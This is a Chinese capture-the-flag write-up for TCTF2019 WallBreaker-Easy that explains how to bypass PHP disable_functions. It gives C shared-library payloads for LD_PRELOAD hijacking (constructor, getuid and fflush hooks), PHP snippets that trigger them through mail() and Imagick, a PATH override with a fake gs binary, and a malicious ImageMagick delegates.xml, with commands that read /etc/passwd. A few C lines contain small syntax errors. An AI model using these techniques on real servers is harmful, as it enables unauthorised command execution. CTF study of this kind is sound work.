# Wallbreaker\_Easy

## Wallbreaker\_Easy

## 考点

* PHP bypass disable\_functions

## wp

TCTF2019 WallBreaker-Easy

提示

> Imagick is a awesome library for hackers to break `disable_functions`.&#x20;
>
> So I installed php-imagick in the server, opened a `backdoor` for you.
>
> Let's try to execute `/readflag` to get the flag.&#x20;
>
> Open basedir: /var/www/html:/tmp/ebe1d01ac021c4a3e68eb5bbdc842e69
>
> Hint: eval($\_POST\["backdoor"]);

给了shell，要命令执行，但是有disable\_functions。这题就是bypass disable\_functions

![](<../.gitbook/assets/image (7).png>)

### 利用LD\_PRELOAD变量

> LD\_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。
>
> 也就是说它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。

该方法绕过disable\_functions的原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令。

通用动态链接库代码

```c
#include <stdlib.h>
__attribute__((constructor)) void hack(){
    unsetenv("LD_PRELOAD");
    if (getenv("cmd") != NULL){
        system(getenv("cmd"));
    }else{
        system("echo 'no cmd' > /tmp/cmd.output");
    }
}
```

> 利用 GNU C 中的特殊语法 `__attribute__ ((attribute-list))`，当参数为 constructor 时就可以在加载共享库时运行，通常是在程序启动过程中，因为带有”构造函数”属性的函数将在 main() 函数之前被执行，类似的，若是换成 destructor 参数，则该函数会在 main() 函数执行之后或者 exit() 被调用后被自动执行
>
> 在 PHP 运行过程中只要有新程序启动，在我们加载恶意动态链接库的条件下，便可以执行 .so 中的恶意代码

使用`strace -f php -r "mail('','','','');" 2>&1 | grep -E "execve|fork|vfork"`可以看到当 PHP 执行`mail()`函数的时候有没有执行程序或者启动新进程



使用`gcc --share -fPIC bad.c -o bad.so`生成动态链接库，上传到目标机器

再使用如下语句就可以执行任意命令，除了`mail()`函数，还可以使用`error_log('',1)` 或者 `mb_send_mail('','','')` 和 `imap_mail("1@a.com","0","1","2","3")`

```php
<?php
putenv("cmd=cat /etc/passwd");
putenv("LD_PRELOAD=./bad.so");
mail('','','','');
```

运行该 PHP 文件即可成功执行命令，就算没有安装 sendmail 也能成功利用

> 一个程序的动态链接库并不是所谓被系统加载的，而是被执行的二进制文件去寻找自己所需要的动态链接库，即便这个库是`LD_PRELOAD` 所设置的，也需要在一个新进程启动之后，由这个进程将库加载进自己的运行环境(甚至如果没有新进程，`LD_PRELOAD` 变量都不会被加载)。

如果没有sendmail那是谁加载了动态链接库。除了 `/usr/bin/php` 之外的第一个进程，其实是`/bin/sh`，而并非`/usr/sbin/sendmail`，也就是说在这一步，真正加载了动态链接库的其实是`/bin/sh` 的进程，其实我们大可不必使用`__attribute__((constructor))` ，直接劫持`/bin/sh` 的库函数即可。要想加载动态链接库，就必须启动一个新进程，只要存在新进程，就能劫持库函数。当然这并不是说`__attribute__((constructor))` 没有意义，毕竟他可以帮我们省略挑选库函数的过程。

劫持`/bin/sh` 的库函数

```c
#include <stdlib.h>
#include <string.h>
void payload() {
    const char* cmd = getenv('CMD')
    system(cmd);
}
int getuid() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

但是这题使用上面的方法是不行的，因为BUU的环境有权限限制，无法上传文件。

### ImageMagick bypass disable\_functions

ImageMagick在处理一些类型的文件的时候需要依赖其他软件，例如`Ghostscript`，但是默认禁止了使用`Ghostscript`处理pdf，ps，epi和xps的文件类型，`Ghostscript`能处理的如下

```
EPI  EPS  EPS2 EPS3 EPSF EPSI EPT PDF PS PS2 PS3
```

只有ept能使用，先`convert 1.png ept:1.ept` 生成一个 `EPT` 文件，再使用`strace -f php index.php 2>&1 | grep -C2 execve`看一下有没有生成新进程，可以看到执行了gs且生成了新程序



执行`readelf -Ws /usr/bin/gs`看一下这个程序都有哪些符号

从符号中可以看出他调用的库函数，我们选择 `fflush` 这个函数来进行劫持

```c
#include <stdlib.h>
#include <string.h>
void payload() {
    const char* cmd = getenv('CMD')
    system(cmd);
}
int fflush() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

然后使用gcc生成动态链接库，然后把生成的ept文件和bad.so上传到服务器上

```php
putenv('LD_PRELOAD=/tmp/3accb9900a8be5421641fb31e6861f33/hack.so'); 
putenv('CMD=/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt');
$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
```

再访问flag.txt即可。

### 利用PATH 变量 <a href="#toc-12" id="toc-12"></a>

Linux中执行一个命令实际上是执行了有一个可执行文件，系统通过PATH环境变量找到命令对应的可执行文件，执行命令时，系统去PATH变量记录的路径下寻找对应的可执行文件

如果通过`putenv` 覆盖PATH变量为可以控制的路径，再将恶意文件上传，命名成对应的命令的名字，程序在执行这个命令的时候，就会执行我们的恶意文件。而 `ImageMagick` 正是通过执行命令的形式启动外部程序的。

```c
#include <stdlib.h>
#include <string.h>
int main() {
    unsetenv("PATH");
    const char* cmd = getenv("CMD");
    system(cmd);
    return 0;
}
```

将上述内容编译后命名为 `gs`，将 `gs` 和 `EPT`文件写入到服务器，然后执行：

```php
putenv('PATH=/tmp/3accb9900a8be5421641fb31e6861f33');
putenv('CMD=/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt');
chmod('/tmp/3accb9900a8be5421641fb31e6861f33/gs','0777');
$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
```

### 利用ImageMagick的配置文件

`ImageMagick`的配置文件位置与环境变量有关，那么结合`putenv` 就可以控制`ImageMagick`的配置。

在`delegates.xml`这个文件内，定义了`ImageMagick`处理各种文件类型的规则

```xml
<delegatemap>
    ......
  <delegate decode="bpg" command="&quot;bpgdec&quot; -b 16 -o &quot;%o.png&quot; &quot;%i&quot;; /bin/mv &quot;%o.png&quot; &quot;%o&quot;"/>
</delegatemap>
```

处理文件所需执行的系统命令均在这个文件中设置，那么我们就可以自定义这个文件来执行命令了。

`EPT` 文件对应的文件格式为：`ps:alpha`，所需要的`delegates.xml`内容就是

```xml
<delegatemap>
  <delegate decode="ps:alpha" command="sh -c &quot;/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&quot;"/>
</delegatemap>
```

将 `delegates.xml` 和 `EPT` 文件写入后，使用题目中的后门执行如下命令即可：

```php
putenv('MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33');
$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
```

## 小结

1. [TCTF2019 WallBreaker-Easy 解题分析](https://xz.aliyun.com/t/4688)
2. [无需sendmail：巧用LD\_PRELOAD突破disable\_functions](https://www.freebuf.com/articles/web/192052.html)
3. 在BUU的环境直接使用蚁剑的插件可以快速获取flag，但没必要
4. PHP7 GC with Certain Destructors UAF，PHP7 Backtrace UAF，PHP 7.0-8.0 disable\_functions bypass \[user\_filter]都可以bypass
